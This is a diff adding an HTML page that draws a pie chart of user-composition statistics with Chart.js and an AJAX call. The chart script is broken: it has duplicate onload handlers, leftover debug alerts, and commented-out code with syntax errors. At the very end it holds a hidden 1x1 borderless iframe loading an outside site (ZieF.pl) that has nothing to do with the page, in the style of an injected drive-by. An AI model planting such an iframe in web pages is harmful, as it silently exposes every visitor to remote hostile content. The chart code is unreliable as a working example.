@@ -1,0 +1,100 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+	<head>      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<title>用户构成统计</title>
+        <!--[if IE]>
+         <script type="text/javascript" src="../excanvas.js" onload="explorercanvasload"></script>
+        <![endif]-->
+		
+	</head>
+	<body>
+		<div id="canvas-holder" style="margin-left:400px;margin-top:50px">
+			<canvas id="chart-area" width="300" height="300"/>
+		</div>
+        <div style="margin-left:800px;list-style-type: none;line-height: 30px;">
+              <ul >
+                  <li style="list-style: none"><span style="width:50px;height: 50px;background-color: red;margin-right: 20px;">&nbsp;&nbsp;&nbsp;&nbsp;</span>2017-11</li>
+                  <li style="list-style: none"><span style="width:50px;height: 50px;background-color: green;margin-right: 20px;">&nbsp;&nbsp;&nbsp;&nbsp;</span>2017-10</li>
+                  <li style="list-style: none"><span style="width:50px;height: 50px;background-color: yellow;margin-right: 20px;">&nbsp;&nbsp;&nbsp;&nbsp;</span>2017-12</li>
+              </ul>  
+        </div>
+     <script type="text/javascript" src="../easyui/jquery.min.js"></script>    <script type="text/javascript" src="../js/Chart.js"></script>
+	<script>
+	 window.onload = function() {     
+	 var ctx = document.getElementById("canvas").getContext("2d");
+	 ctx.fillRect(10, 10, 20, 20);
+ };
+		var pieData = tu();  /*  [
+				{
+					value: 50,
+					color:"#F7464A",				
+					highlight: "#FF5A5E",
+					label: "Red"
+				},
+				{
+					value: 30,
+					color: "#46BFBD",
+					highlight: "#5AD3D1",
+					label: "Green"
+				},                {					value: 0,					color: "#46BFBD",					highlight: "#5AD3D1",					label: "Green"				}
+
+			];  */
+		
+			window.onload = function(){
+				var ctx = document.getElementById("chart-area").getContext("2d");
+				window.myPie = new Chart(ctx).Pie(pieData);
+			};
+			
+
+			
+			
+			         function tu(){
+        	 var str1;
+  			$.ajax({			
+  				url:"../statistics/statisticsQuery?operation=${operation}",
+  				type:"get",
+  				cache:false,					
+  				success:function(result){
+  					for(var i=0;i<result.length;i++){
+  						str1+="fsdfs"
+  						alert(result.length)
+  						/* if('${operation}'=='client'){
+  							if(i!=result.length-1){
+  	  							 str1+='{value:'+result[i].client+'},'
+  	  			             }else{
+  	  			            	 str1+='{value:'+result[i].+'}]' 
+  	  			             }
+  						}else if('${operation}'=='lsClient'){
+  							if(i!=result.length-1){
+  	  							 str1+='{value:'+result[i].+'},'
+  	  			             }else{
+  	  			            	 str1+='{value:'+result[i].+'}]' 
+  	  			             }
+  						}else if('${operation}'=='contribute'){
+  							if(i!=result.length-1){
+  	  							 str1+='{value:'+result[i].+'},'
+  	  			             }else{
+  	  			            	 str1+='{value:'+result[i].+'}]' 
+  	  			             }
+  						}else if('${operation}'=='serve'){
+  							if(i!=result.length-1){
+  	  							 str1+='{value:'+result[i].+'},'
+  	  			             }else{
+  	  			            	 str1+='{value:'+result[i].+'}]' 
+  	  			             }
+  						} */
+  						 
+  					}
+  					
+  				}
+  		}) 
+  		 alert(str1) 
+  		/* var json = eval(str1) */
+  		return "";
+    			
+        } 
+
+	</script>
+	<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
